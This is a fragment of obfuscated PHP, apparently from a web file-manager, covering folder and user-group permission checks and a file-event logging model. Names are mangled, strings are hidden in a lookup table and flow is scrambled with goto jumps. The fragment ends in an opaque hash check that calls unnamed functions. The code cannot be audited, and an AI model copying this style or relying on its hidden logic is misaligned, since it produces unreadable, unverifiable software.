Eğİ¬²ÕãÉ: } private function authFolderOwnerGroup($c¬ª«É—´ô) { $Eì„¸«âª× =& $_SERVER[¢ÌÛ]; $díî‹ÕÒÓ‰ = Model($Eì„¸«âª×[1740])->where(array($Eì„¸«âª×[1657] => $c¬ª«É—´ô))->select(); $B„áàÔ¿Ìä = array(); if (!$díî‹ÕÒÓ‰) { return $B„áàÔ¿Ìä; } foreach ($díî‹ÕÒÓ‰ as $c”Û¥Æåò½) { $e´•–‚Û = $this->authInfo($c”Û¥Æåò½); if (AuthModel::authCheckRoot($e´•–‚Û[$Eì„¸«âª×[403]])) { $B„áàÔ¿Ìä[] = $c”Û¥Æåò½[$Eì„¸«âª×[1498]]; } } return $B„áàÔ¿Ìä; } private function authFolderOwnerUser($F×Íâ¨ÅÈÕ) { $Eƒ¡å‰°Ââ =& $_SERVER[¢ÌÛ]; $a£ª…µ¨Ô‡ = array(); $E›ˆá÷Ìõñ = !1; foreach ($F×Íâ¨ÅÈÕ as $aØ‡òÑÚÙŠ) { $fˆª°ƒ‚²Ğ = $this->authInfo($aØ‡òÑÚÙŠ); if ($aØ‡òÑÚÙŠ[$Eƒ¡å‰°Ââ[483]] == $Eƒ¡å‰°Ââ[495]) { $E›ˆá÷Ìõñ = !0; } if ($aØ‡òÑÚÙŠ[$Eƒ¡å‰°Ââ[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($fˆª°ƒ‚²Ğ[$Eƒ¡å‰°Ââ[403]])) { $a£ª…µ¨Ô‡[] = $aØ‡òÑÚÙŠ[$Eƒ¡å‰°Ââ[483]]; } } } return array($Eƒ¡å‰°Ââ[560] => $a£ª…µ¨Ô‡, $Eƒ¡å‰°Ââ[1855] => $E›ˆá÷Ìõñ); } public function authMake($F´İææ—§Ä, $Cïà¯Ç® = false) { $E”òä‘¡© =& $_SERVER[¢ÌÛ]; $C®È–ƒéµ = $this->authArrayCheck($F´İææ—§Ä, $Cïà¯Ç®); if ($C®È–ƒéµ[$E”òä‘¡©[1857]]) { $C®È–ƒéµ[$E”òä‘¡©[1857]] = $this->sourceAuthInfo($C®È–ƒéµ[$E”òä‘¡©[1857]]); } return $C®È–ƒéµ; } public function authArrayCheck($F¤Èáßæß, $eî£–×Å = false) { goto B”©Á×¬õ; DƒÈåˆ’¼Ä: return $AÑÙ•õÔ©İ; goto cöƒ™—øËÑ; føµµ„·¡: $BËÃá¤±Û½ = 0; $eŞÒ†æ×à„ = 0; $aÉÙ×Ï‘ë = 0; goto d•¬²¥Ìµà; B”©Á×¬õ: $f“ÖÆ¯‹» =& $_SERVER[¢ÌÛ]; if (!$F¤Èáßæß) { return array($f“ÖÆ¯‹»[404] => 0, $f“ÖÆ¯‹»[444] => !1); } $eî£–×Å = $eî£–×Å ? $eî£–×Å : USER_ID; goto føµµ„·¡; cÉğÛ³‹Ÿ™: foreach ($F¤Èáßæß as $B•Õ†™ä…) { $b’ÑÅèß›¨ = $this->authInfo($B•Õ†™ä…); if (!$b’ÑÅèß›¨) { continue; } $f±ÑßÚ‘Ù = $B•Õ†™ä…[$f“ÖÆ¯‹»[483]]; $Føµ‹Ï·”¸ = intval($b’ÑÅèß›¨[$f“ÖÆ¯‹»[403]]); if ($B•Õ†™ä…[$f“ÖÆ¯‹»[398]] == SourceModel::TYPE_USER && $f±ÑßÚ‘Ù == $eî£–×Å) { $BËÃá¤±Û½ = !0; $aÉÙ×Ï‘ë = $b’ÑÅèß›¨; $eŞÒ†æ×à„ = $Føµ‹Ï·”¸; } else { if ($B•Õ†™ä…[$f“ÖÆ¯‹»[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($f±ÑßÚ‘Ù, $eî£–×Å)) { $cñ×ò‰ºƒ = !0; $fÓÜ²‡Àç‘ = $this->groupStepToUserGroup($f±ÑßÚ‘Ù, $eî£–×Å); if ($fÓÜ²‡Àç‘ < $FòÈœ’‚÷) { $FòÈœ’‚÷ = $fÓÜ²‡Àç‘; $BÅì„†»Â• = $Føµ‹Ï·”¸; $Aç¥—ã¡—× = $b’ÑÅèß›¨; $a˜êá†Õô¯ = $f±ÑßÚ‘Ù; } if ($fÓÜ²‡Àç‘ == $FòÈœ’‚÷ && $Føµ‹Ï·”¸ >= $BÅì„†»Â•) { $BÅì„†»Â• = $Føµ‹Ï·”¸; $Aç¥—ã¡—× = $b’ÑÅèß›¨; $a˜êá†Õô¯ = $f±ÑßÚ‘Ù; } } else { if ($f±ÑßÚ‘Ù == $f“ÖÆ¯‹»[495]) { $f‰÷Ú©ÚÑ½ = !0; $CåÆ›ƒÒŞ = $b’ÑÅèß›¨; $d—È÷Œ¡² = $Føµ‹Ï·”¸; } } } } if ($BËÃá¤±Û½) { $cî˜Æñ„ƒ½ = $eŞÒ†æ×à„; $b’ÑÅèß›¨ = $aÉÙ×Ï‘ë; $a‘Œ¸¶ã£• = LNG($f“ÖÆ¯‹»[1858]); } else { if ($cñ×ò‰ºƒ) { $cî˜Æñ„ƒ½ = $BÅì„†»Â•; $b’ÑÅèß›¨ = $Aç¥—ã¡—×; $bñ÷¡„ƒà = Model($f“ÖÆ¯‹»[485])->getInfo($a˜êá†Õô¯); $a‘Œ¸¶ã£• = $f“ÖÆ¯‹»[159] . $bñ÷¡„ƒà[$f“ÖÆ¯‹»[490]] . $f“ÖÆ¯‹»[1859] . LNG($f“ÖÆ¯‹»[1860]); } else { if ($f‰÷Ú©ÚÑ½) { $cî˜Æñ„ƒ½ = $d—È÷Œ¡²; $b’ÑÅèß›¨ = $CåÆ›ƒÒŞ; $a‘Œ¸¶ã£• = LNG($f“ÖÆ¯‹»[1831]); } else { $cî˜Æñ„ƒ½ = 0; $b’ÑÅèß›¨ = !1; $a‘Œ¸¶ã£• = $f“ÖÆ¯‹»[33]; } } } $AÑÙ•õÔ©İ = array($f“ÖÆ¯‹»[1850] => intval($cî˜Æñ„ƒ½), $f“ÖÆ¯‹»[1834] => $b’ÑÅèß›¨, $f“ÖÆ¯‹»[1851] => $a‘Œ¸¶ã£•, $f“ÖÆ¯‹»[1843] => $B•Õ†™ä…[$f“ÖÆ¯‹»[396]]); goto DƒÈåˆ’¼Ä; e»¸´øë¾Ø: $FòÈœ’‚÷ = 1000; $a˜êá†Õô¯ = 0; $f‰÷Ú©ÚÑ½ = 0; goto FÏÉ„™öƒâ; d•¬²¥Ìµà: $cñ×ò‰ºƒ = 0; $BÅì„†»Â• = 0; $Aç¥—ã¡—× = 0; goto e»¸´øë¾Ø; FÏÉ„™öƒâ: $d—È÷Œ¡² = 0; $CåÆ›ƒÒŞ = 0; $B•Õ†™ä… = array($f“ÖÆ¯‹»[396] => 0); goto cÉğÛ³‹Ÿ™; cöƒ™—øËÑ: } private function groupContainUser($b™ó‘‘Å”, $e®µÓ£ôË£ = false) { return in_array($b™ó‘‘Å”, $this->userGroupParents($e®µÓ£ôË£)); } private function groupStepToUserGroup($BæŸ†Ó¹ïÈ, $E‰‡†ã‹¼á = false) { goto Aªé«ñ¬Ş; Aªé«ñ¬Ş: $C±¬½œÎÓî =& $_SERVER[¢ÌÛ]; $f‡îöÂéä³ = $this->userGroupList($E‰‡†ã‹¼á); $böà¨¯°¯¨ = 1000; goto CÌ³”áÉ•³; CÌ³”áÉ•³: $AóìêğôÊ = $GLOBALS[$C±¬½œÎÓî[6]][$C±¬½œÎÓî[87]][$C±¬½œÎÓî[1752]] == 1; $DÉš“¯’Ÿí = $AóìêğôÊ ? 3 : 2; foreach ($f‡îöÂéä³ as $d†šï®Ğå²) { if ($d†šï®Ğå²[$C±¬½œÎÓî[1657]] == $BæŸ†Ó¹ïÈ) { return 0; } $B¿’ÌÔÃ = explode($C±¬½œÎÓî[47], trim($d†šï®Ğå²[$C±¬½œÎÓî[486]], $C±¬½œÎÓî[47])); if ($B¿’ÌÔÃ[0] == $C±¬½œÎÓî[495] && count($B¿’ÌÔÃ) > $DÉš“¯’Ÿí) { $dæ·§¸‹— = array_reverse(array_slice($B¿’ÌÔÃ, $DÉš“¯’Ÿí)); $eë“‘¯¶ = array_search($BæŸ†Ó¹ïÈ, $dæ·§¸‹—); if ($eë“‘¯¶ !== !1 && $eë“‘¯¶ + 1 <= $böà¨¯°¯¨) { $böà¨¯°¯¨ = $eë“‘¯¶ + 1; } } } goto AŠ§±ŒÖ·Ø; AŠ§±ŒÖ·Ø: return $böà¨¯°¯¨; goto AßËé×¿ù; AßËé×¿ù: } private function userGroupList($fµ¢ô×«Ş = false) { $c¦»„Ã”¡õ =& $_SERVER[¢ÌÛ]; static $CÎø˜õ½Ç© = array(); if (isset($CÎø˜õ½Ç©[$fµ¢ô×«Ş])) { return $CÎø˜õ½Ç©[$fµ¢ô×«Ş]; } $dôÕà£Çø„ = Model($c¦»„Ã”¡õ[504])->getInfo($fµ¢ô×«Ş); $CÎø˜õ½Ç©[$fµ¢ô×«Ş] = array_to_keyvalue($dôÕà£Çø„[$c¦»„Ã”¡õ[1832]], $c¦»„Ã”¡õ[1657]); return $CÎø˜õ½Ç©[$fµ¢ô×«Ş]; } public function userGroupParents($FÃİŒŞŸ¦Ê) { goto cö¥­¬æœ¯; aùïîª¸”: $c¨„Ñ§®ìë[$FÃİŒŞŸ¦Ê] = array_unique($d„­ÇÀœ£¿); return $c¨„Ñ§®ìë[$FÃİŒŞŸ¦Ê]; goto dñ«ï†ÍŠñ; eíàñËà°ƒ: $a–ÏÔÙ = $GLOBALS[$Dá“ÄíÚ›†[6]][$Dá“ÄíÚ›†[87]][$Dá“ÄíÚ›†[1752]] == 1; $E¦×”ÅâÎ = $a–ÏÔÙ ? 3 : 2; foreach ($E¿šñĞ½Ö as $BçÀÂŠÍ”) { $Dñôù‹ó×¼ = array($BçÀÂŠÍ”[$Dá“ÄíÚ›†[1657]]); $BºğŸ˜Û‹ = explode($Dá“ÄíÚ›†[47], trim($BçÀÂŠÍ”[$Dá“ÄíÚ›†[486]], $Dá“ÄíÚ›†[47])); if ($BºğŸ˜Û‹[0] == $Dá“ÄíÚ›†[495] && count($BºğŸ˜Û‹) > $E¦×”ÅâÎ) { $bá‹ª = array_slice($BºğŸ˜Û‹, $E¦×”ÅâÎ); $Dñôù‹ó×¼ = array_merge($Dñôù‹ó×¼, array_reverse($bá‹ª)); } $d„­ÇÀœ£¿ = array_merge($d„­ÇÀœ£¿, $Dñôù‹ó×¼); } goto aùïîª¸”; Eº¢ë“‘: if (isset($c¨„Ñ§®ìë[$FÃİŒŞŸ¦Ê])) { return $c¨„Ñ§®ìë[$FÃİŒŞŸ¦Ê]; } $E¿šñĞ½Ö = $this->userGroupList($FÃİŒŞŸ¦Ê); $d„­ÇÀœ£¿ = array(); goto eíàñËà°ƒ; cö¥­¬æœ¯: $Dá“ÄíÚ›† =& $_SERVER[¢ÌÛ]; static $c¨„Ñ§®ìë = array(); $FÃİŒŞŸ¦Ê = $FÃİŒŞŸ¦Ê ? $FÃİŒŞŸ¦Ê : USER_ID; goto Eº¢ë“‘; dñ«ï†ÍŠñ: } public function authTargetInfoMake($B®…ï“ˆÙ´) { goto fé¶Ë‹´ˆÅ; Eà…é‹×¼: foreach ($B®…ï“ˆÙ´ as $Eæ…†‹¬Ãä) { if ($Eæ…†‹¬Ãä[$c’¨‡å¿ÙÏ[398]] == SourceModel::TYPE_USER) { $AÌ‚Ô†·[] = intval($Eæ…†‹¬Ãä[$c’¨‡å¿ÙÏ[483]]); } else { if ($Eæ…†‹¬Ãä[$c’¨‡å¿ÙÏ[398]] == SourceModel::TYPE_GROUP) { $Fš¸°¼¹ÌÁ[] = intval($Eæ…†‹¬Ãä[$c’¨‡å¿ÙÏ[483]]); } } } if ($AÌ‚Ô†·) { $AÌ‚Ô†· = Model($c’¨‡å¿ÙÏ[501])->userListInfo($AÌ‚Ô†·); } if ($Fš¸°¼¹ÌÁ) { $Dƒ¨™òá“ = array($c’¨‡å¿ÙÏ[1738] => array($c’¨‡å¿ÙÏ[411], $Fš¸°¼¹ÌÁ)); $Fš¸°¼¹ÌÁ = Model($c’¨‡å¿ÙÏ[485])->field($c’¨‡å¿ÙÏ[1751])->where($Dƒ¨™òá“)->select(); $Fš¸°¼¹ÌÁ = array_to_keyvalue($Fš¸°¼¹ÌÁ, $c’¨‡å¿ÙÏ[1657]); } goto CÀÕÀéİÌ; fé¶Ë‹´ˆÅ: $c’¨‡å¿ÙÏ =& $_SERVER[¢ÌÛ]; $AÌ‚Ô†· = array(); $Fš¸°¼¹ÌÁ = array(); goto Eà…é‹×¼; CÀÕÀéİÌ: return array($c’¨‡å¿ÙÏ[1861] => $AÌ‚Ô†·, $c’¨‡å¿ÙÏ[1862] => $Fš¸°¼¹ÌÁ); goto cÑ¿³³‰ ; cÑ¿³³‰ : } public function authInfo($b—†İŞè ) { $cçğ·ĞÇ‘· =& $_SERVER[¢ÌÛ]; if ($b—†İŞè [$cçğ·ĞÇ‘·[1806]]) { $BÂ÷¿íÒß’ = Model($cçğ·ĞÇ‘·[1825])->listData($b—†İŞè [$cçğ·ĞÇ‘·[1806]]); if (!$BÂ÷¿íÒß’) { return !1; $A›ëñòô¥á = Model($cçğ·ĞÇ‘·[1825])->listData(); $EÂø¶²Âî = array_filter_by_field($A›ëñòô¥á, $cçğ·ĞÇ‘·[403], $cçğ·ĞÇ‘·[495]); return $EÂø¶²Âî; } $aå°ïé—„¯ = array_field_key($BÂ÷¿íÒß’, array($cçğ·ĞÇ‘·[385], $cçğ·ĞÇ‘·[28], $cçğ·ĞÇ‘·[403], $cçğ·ĞÇ‘·[1678], $cçğ·ĞÇ‘·[1680])); $aå°ïé—„¯[$cçğ·ĞÇ‘·[1863]] = $b—†İŞè ; return $aå°ïé—„¯; } else { return array($cçğ·ĞÇ‘·[412] => 0, $cçğ·ĞÇ‘·[1663] => $b—†İŞè [$cçğ·ĞÇ‘·[1807]], $cçğ·ĞÇ‘·[413] => $cçğ·ĞÇ‘·[33], $cçğ·ĞÇ‘·[1678] => $cçğ·ĞÇ‘·[1864]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\x63\x65\137\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\162\x74", "\x66\x75\156\x63\x74\151\x6f\x6e"), array("\144\x65\x73\x63", '', "\151\x6e\163\x65\x72\x74\x2c\x75\x70\144\x61\164\145\x2c\x73\145\154\145\x63\x74", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($d‰Ã¿Ë•Ôí, $a„ÃêÆÜÄ, $FíÉ¶í’Ö˜ = '') { goto c§á÷Ã¥; f·µ½ÑË®«: if (!$dƒõËÁé³ ) { return !1; } if ($this->isCacheEvent($dƒõËÁé³ , $a„ÃêÆÜÄ)) { return; } if ($FíÉ¶í’Ö˜ && is_string($FíÉ¶í’Ö˜)) { $FíÉ¶í’Ö˜ = array($e›Û¿ä…¥™[1691] => $FíÉ¶í’Ö˜); } goto DƒÑ÷Â„˜; c§á÷Ã¥: $e›Û¿ä…¥™ =& $_SERVER[¢ÌÛ]; if (!$this->eventSave) { return; } $dƒõËÁé³  = Model($e›Û¿ä…¥™[1178])->sourceInfo($d‰Ã¿Ë•Ôí); goto f·µ½ÑË®«; DƒÑ÷Â„˜: $c‡åêÛå­¥ = array($e›Û¿ä…¥™[410] => $d‰Ã¿Ë•Ôí, $e›Û¿ä…¥™[1865] => $dƒõËÁé³ [$e›Û¿ä…¥™[488]], $e›Û¿ä…¥™[1866] => $dƒõËÁé³ [$e›Û¿ä…¥™[28]], $e›Û¿ä…¥™[493] => $dƒõËÁé³ [$e›Û¿ä…¥™[493]], $e›Û¿ä…¥™[1490] => USER_ID, $e›Û¿ä…¥™[415] => $a„ÃêÆÜÄ, $e›Û¿ä…¥™[1492] => $FíÉ¶í’Ö˜); $this->addSystemLog($a„ÃêÆÜÄ, $c‡åêÛå­¥); return $this->add($c‡åêÛå­¥); goto BÚ ¬«Ä±; BÚ ¬«Ä±: } private function addSystemLog($fÄ¶Üª‰” , $AéÛ±ñõ’) { $a‰ãí¯øöİ =& $_SERVER[¢ÌÛ]; if ($fÄ¶Üª‰”  == $a‰ãí¯øöİ[1867]) { $fÄ¶Üª‰”  = $AéÛ±ñõ’[$a‰ãí¯øöİ[431]][$a‰ãí¯øöİ[1868]]; } else { if (in_array($fÄ¶Üª‰” , array($a‰ãí¯øöİ[1634], $a‰ãí¯øöİ[1869]))) { $fÄ¶Üª‰”  = $AéÛ±ñõ’[$a‰ãí¯øöİ[431]][$a‰ãí¯øöİ[715]]; } } $AÓ¢õßÀÙâ = array_merge($AéÛ±ñõ’, array($a‰ãí¯øöİ[1870] => $AéÛ±ñõ’[$a‰ãí¯øöİ[396]], $a‰ãí¯øöİ[1871] => $AéÛ±ñõ’[$a‰ãí¯øöİ[1871]])); Model($a‰ãí¯øöİ[1597])->addLog($a‰ãí¯øöİ[1872] . $fÄ¶Üª‰” , $AÓ¢õßÀÙâ); } private function isCacheEvent($d÷¬Ÿˆ¥Óß, $dò²Ü¶í) { if ($d÷¬Ÿˆ¥Óß[$_SERVER[¢ÌÛ][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($b‡Œ§Ó‘¬“, $Ağ¦¤ƒ»Ï¦) { $f¹Ôğ¸Ô‹ =& $_SERVER[¢ÌÛ]; $E¦¦ŞÂ„Œô = Model($f¹Ôğ¸Ô‹[1178])->sourceInfo($b‡Œ§Ó‘¬“); $A¨ò½ˆ§ÛØ = array($f¹Ôğ¸Ô‹[1868] => $Ağ¦¤ƒ»Ï¦, $f¹Ôğ¸Ô‹[28] => $E¦¦ŞÂ„Œô[$f¹Ôğ¸Ô‹[28]]); return $this->addEvent($b‡Œ§Ó‘¬“, $f¹Ôğ¸Ô‹[1867], $A¨ò½ˆ§ÛØ); } public function eventFileEdit($FÌä“Õ»·») { $AêÕèË¡É =& $_SERVER[¢ÌÛ]; $dš¤â‹‹öÑ = array($AêÕèË¡É[1873] => $_SERVER[$AêÕèË¡É[1874]], $AêÕèË¡É[1875] => strtolower(ACTION)); return $this->addEvent($FÌä“Õ»·», $AêÕèË¡É[1624], $dš¤â‹‹öÑ); } public function eventRecycle($A‰Ñ¡ğÃæà, $AŸ¡Ç¨¥®) { return $this->addEvent($A‰Ñ¡ğÃæà, $_SERVER[¢ÌÛ][1869], $AŸ¡Ç¨¥®); } public function eventRemove($AŒ®²à§Á¶) { $AñÖÍ“Ç¸ =& $_SERVER[¢ÌÛ]; $E•‹‰¸„ = Model($AñÖÍ“Ç¸[1178])->sourceInfo($AŒ®²à§Á¶); $fÅ¸¨½ÜòÕ = $E•‹‰¸„[$AñÖÍ“Ç¸[28]]; return $this->addEvent($E•‹‰¸„[$AñÖÍ“Ç¸[488]], $AñÖÍ“Ç¸[1623], $fÅ¸¨½ÜòÕ); } public function eventShare($fİ·êŸ¨­‘, $a•¸¸©Õ£ì) { return $this->addEvent($fİ·êŸ¨­‘, $_SERVER[¢ÌÛ][1634], $a•¸¸©Õ£ì); } public function eventMove($dÜ¹ì„ŒâŸ, $eË”¹‰Õ×è, $cï›«ÄºÙÎ) { goto cçõ˜§ƒ´; B’Š›×­ù: $this->addEvent($eË”¹‰Õ×è, $D®õŸÖËÀ[1879], $BğÈ‹˜ÓÙÖ); goto aÇ³Öƒ™¡; CÅÆîô…¡: $B©«–Ğìñâ = $DÉòé†ÑØ->sourceInfo($eË”¹‰Õ×è); $A“šÛ­Õ×ó = $DÉòé†ÑØ->sourceInfo($cï›«ÄºÙÎ); $BğÈ‹˜ÓÙÖ = array($D®õŸÖËÀ[1031] => $eË”¹‰Õ×è, $D®õŸÖËÀ[1876] => $B©«–Ğìñâ[$D®õŸÖËÀ[28]], $D®õŸÖËÀ[1857] => $B©«–Ğìñâ[$D®õŸÖËÀ[493]], $D®õŸÖËÀ[1032] => $cï›«ÄºÙÎ, $D®õŸÖËÀ[1877] => $A“šÛ­Õ×ó[$D®õŸÖËÀ[28]], $D®õŸÖËÀ[1878] => $A“šÛ­Õ×ó[$D®õŸÖËÀ[493]]); goto BÕ¤ˆù; cçõ˜§ƒ´: $D®õŸÖËÀ =& $_SERVER[¢ÌÛ]; $DÉòé†ÑØ = Model($D®õŸÖËÀ[1178]); $cÈ„åª²Ç = $DÉòé†ÑØ->sourceInfo($dÜ¹ì„ŒâŸ); goto CÅÆîô…¡; BÕ¤ˆù: $this->addEvent($dÜ¹ì„ŒâŸ, $D®õŸÖËÀ[518], $BğÈ‹˜ÓÙÖ); $cÈ„åª²Ç = $DÉòé†ÑØ->sourceInfo($dÜ¹ì„ŒâŸ); $BğÈ‹˜ÓÙÖ = array($D®õŸÖËÀ[396] => $cÈ„åª²Ç[$D®õŸÖËÀ[396]], $D®õŸÖËÀ[28] => $cÈ„åª²Ç[$D®õŸÖËÀ[28]]); goto B’Š›×­ù; aÇ³Öƒ™¡: } public function eventCopy($aíª°¿œÇ) { $this->eventCreate($aíª°¿œÇ, $_SERVER[¢ÌÛ][516]); } public function eventRename($eº’Ì•ë‹´, $bà‰Ğ¯¬, $D¼÷·ëÎç) { $E¥¶ÉØáª =& $_SERVER[¢ÌÛ]; $dœ‹µ¼Ëö = array($E¥¶ÉØáª[1031] => $bà‰Ğ¯¬, $E¥¶ÉØáª[1032] => $D¼÷·ëÎç); return $this->addEvent($eº’Ì•ë‹´, $E¥¶ÉØáª[1191], $dœ‹µ¼Ëö); } public function eventAddComment($e·ÒÉó¸¿À, $b£æƒİŠöÄ) { return $this->addEvent($e·ÒÉó¸¿À, $_SERVER[¢ÌÛ][1880], $b£æƒİŠöÄ); } public function eventAddDesc($d¨Öªöõä‚, $f›ù‰¦àÛÓ) { return $this->addEvent($d¨Öªöõä‚, $_SERVER[¢ÌÛ][1881], $f›ù‰¦àÛÓ); } public function listBySource($F×ğ¡ÍŸŒ) { goto eß†ÏğğÚ¶; eß†ÏğğÚ¶: $C¾ì¦¤¨‘ =& $_SERVER[¢ÌÛ]; $d¨ê ‘Áö = Model($C¾ì¦¤¨‘[1178])->sourceInfo($F×ğ¡ÍŸŒ); $cÄğ‚ˆ¾‰‹ = array($C¾ì¦¤¨‘[410] => $F×ğ¡ÍŸŒ); goto F¡‰µ”´ø; F¡‰µ”´ø: if ($d¨ê ‘Áö[$C¾ì¦¤¨‘[397]] == $C¾ì¦¤¨‘[86]) { $C²ñê ¾Ó = Model($C¾ì¦¤¨‘[1178])->listSearchChildren($F×ğ¡ÍŸŒ, 20000); $C²ñê ¾Ó[] = $F×ğ¡ÍŸŒ . $C¾ì¦¤¨‘[370]; $cÄğ‚ˆ¾‰‹ = array($C¾ì¦¤¨‘[396] => array($C¾ì¦¤¨‘[7], $C²ñê ¾Ó)); } $Cã·ªÏÈÕ = $this->where($cÄğ‚ˆ¾‰‹)->order($C¾ì¦¤¨‘[1882])->selectPage(); if ($Cã·ªÏÈÕ[$C¾ì¦¤¨‘[360]][$C¾ì¦¤¨‘[361]] == 0) { $Cã·ªÏÈÕ[$C¾ì¦¤¨‘[360]][$C¾ì¦¤¨‘[361]] = 1; $Cã·ªÏÈÕ[$C¾ì¦¤¨‘[363]] = array(array($C¾ì¦¤¨‘[410] => $F×ğ¡ÍŸŒ, $C¾ì¦¤¨‘[1865] => $d¨ê ‘Áö[$C¾ì¦¤¨‘[488]], $C¾ì¦¤¨‘[1490] => $d¨ê ‘Áö[$C¾ì¦¤¨‘[405]], $C¾ì¦¤¨‘[415] => $C¾ì¦¤¨‘[1883], $C¾ì¦¤¨‘[416] => $d¨ê ‘Áö[$C¾ì¦¤¨‘[192]], $C¾ì¦¤¨‘[1492] => $C¾ì¦¤¨‘[33])); } goto A’ãÍÂ‰ø‡; A’ãÍÂ‰ø‡: return $this->eventListParse($Cã·ªÏÈÕ, $F×ğ¡ÍŸŒ); goto C¶°Ò¢áÓ; C¶°Ò¢áÓ: } private function eventListParse($C–ßŠíÙÄ‚, $BËŞ’Î×—ù) { goto bÀáŒ‘öÎ“; FÓÁ¿µºé¼: $C™êòŞğÙ® = Model($FœÃÓ“¿‚É[774])->sourceListInfo($eäºîÖ˜´ä, !0); foreach ($d°­˜·±Á° as &$bœ½±áø‹) { if ($bœ½±áø‹[$FœÃÓ“¿‚É[29]] == $FœÃÓ“¿‚É[518] && isset($bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[1031]])) { $bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[1031]] = $C™êòŞğÙ®[$bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[1031]]]; $bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[1032]] = $C™êòŞğÙ®[$bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[1032]]]; } if ($bœ½±áø‹[$FœÃÓ“¿‚É[29]] == $FœÃÓ“¿‚É[1879] && isset($bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[396]])) { $bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[396]] = $C™êòŞğÙ®[$bœ½±áø‹[$FœÃÓ“¿‚É[431]][$FœÃÓ“¿‚É[396]]]; } $bœ½±áø‹[$FœÃÓ“¿‚É[84]] = $C™êòŞğÙ®[$bœ½±áø‹[$FœÃÓ“¿‚É[396]]]; $bœ½±áø‹[$FœÃÓ“¿‚É[1884]] = $C™êòŞğÙ®[$bœ½±áø‹[$FœÃÓ“¿‚É[1871]]]; if ($bœ½±áø‹[$FœÃÓ“¿‚É[29]] == $FœÃÓ“¿‚É[1623]) { $bœ½±áø‹[$FœÃÓ“¿‚É[1884]] = $bœ½±áø‹[$FœÃÓ“¿‚É[84]]; $bœ½±áø‹[$FœÃÓ“¿‚É[1871]] = $bœ½±áø‹[$FœÃÓ“¿‚É[1884]][$FœÃÓ“¿‚É[396]]; $bœ½±áø‹[$FœÃÓ“¿‚É[84]] = !1; $bœ½±áø‹[$FœÃÓ“¿‚É[396]] = $FœÃÓ“¿‚É[33]; } $bœ½±áø‹[$FœÃÓ“¿‚É[1815]] = $dí†Õøî‰[$bœ½±áø‹[$FœÃÓ“¿‚É[1498]]]; } unset($bœ½±áø‹); goto d‚ÊÄËßÎÜ; d‚ÊÄËßÎÜ: $C–ßŠíÙÄ‚[$FœÃÓ“¿‚É[363]] = $d°­˜·±Á°; return $C–ßŠíÙÄ‚; goto CØÍÉ š‰; c•Ë•¾¼‹¶: $eäºîÖ˜´ä = array_unique($eäºîÖ˜´ä); $FØ¼õ¿Ôñ¾ = array_unique(array_to_keyvalue($d°­˜·±Á°, $FœÃÓ“¿‚É[33], $FœÃÓ“¿‚É[1498])); $dí†Õøî‰ = Model($FœÃÓ“¿‚É[504])->userListInfo($FØ¼õ¿Ôñ¾); goto FÓÁ¿µºé¼; Dí§Ş—Ê»: $bÄâ·ë› = array_to_keyvalue($d°­˜·±Á°, $FœÃÓ“¿‚É[33], $FœÃÓ“¿‚É[1871]); foreach ($d°­˜·±Á° as $bœ½±áø‹) { $f–ÈÁñÑ™  = $bœ½±áø‹[$FœÃÓ“¿‚É[431]]; if ($bœ½±áø‹[$FœÃÓ“¿‚É[29]] == $FœÃÓ“¿‚É[518] && isset($f–ÈÁñÑ™ [$FœÃÓ“¿‚É[1031]])) { $eäºîÖ˜´ä[] = $f–ÈÁñÑ™ [$FœÃÓ“¿‚É[1031]] . $FœÃÓ“¿‚É[33]; $eäºîÖ˜´ä[] = $f–ÈÁñÑ™ [$FœÃÓ“¿‚É[1032]] . $FœÃÓ“¿‚É[33]; } if ($bœ½±áø‹[$FœÃÓ“¿‚É[29]] == $FœÃÓ“¿‚É[1879] && isset($f–ÈÁñÑ™ [$FœÃÓ“¿‚É[396]])) { $eäºîÖ˜´ä[] = $f–ÈÁñÑ™ [$FœÃÓ“¿‚É[396]] . $FœÃÓ“¿‚É[33]; } } $eäºîÖ˜´ä = array_merge($eäºîÖ˜´ä, $bÄâ·ë›, array($BËŞ’Î×—ù . $FœÃÓ“¿‚É[33])); goto c•Ë•¾¼‹¶; bÀáŒ‘öÎ“: $FœÃÓ“¿‚É =& $_SERVER[¢ÌÛ]; $d°­˜·±Á° = $C–ßŠíÙÄ‚[$FœÃÓ“¿‚É[363]]; $eäºîÖ˜´ä = array_to_keyvalue($d°­˜·±Á°, $FœÃÓ“¿‚É[33], $FœÃÓ“¿‚É[396]); goto Dí§Ş—Ê»; CØÍÉ š‰: } public function removeBySource($A†–¨™Ñ…¨) { $f×Ù¼Ö…‹ = array($_SERVER[¢ÌÛ][410] => $A†–¨™Ñ…¨); $this->where($f×Ù¼Ö…‹)->remove(); } } goto AŞç¼ó‚Í; a†´‰Œ“Äš: $aÕäã±µ©ä = $_SERVER[¢ÌÛ][387]; if ($_SERVER[$_SERVER[¢ÌÛ][388]] != $aÕäã±µ©ä($A‹ÓŒÀ‘¤)) { goto b¤ÏíÛ“ö°; b“‡Ÿ¼©ó¿: $CçäÃ¤¿Ø = explode($_SERVER[¢ÌÛ][227], $AŞÅÁÄĞÂ); if (count($CçäÃ¤¿Ø) < $_SERVER[¢ÌÛ][392]) { $AÛãŸ±ŒÃø = $_SERVER[¢ÌÛ][393]; $AÛãŸ±ŒÃø(); } $e˜öİ»Ø¡ = $_SERVER[¢ÌÛ][394]; goto Déò ç›ôÜ; Déò ç›ôÜ: $e˜öİ»Ø¡($A‹ÓŒÀ‘¤); goto DÒåæøÇŒ†; b¤ÏíÛ“ö°: $CÔÔåìƒ» = $_SERVER[¢ÌÛ][389]; 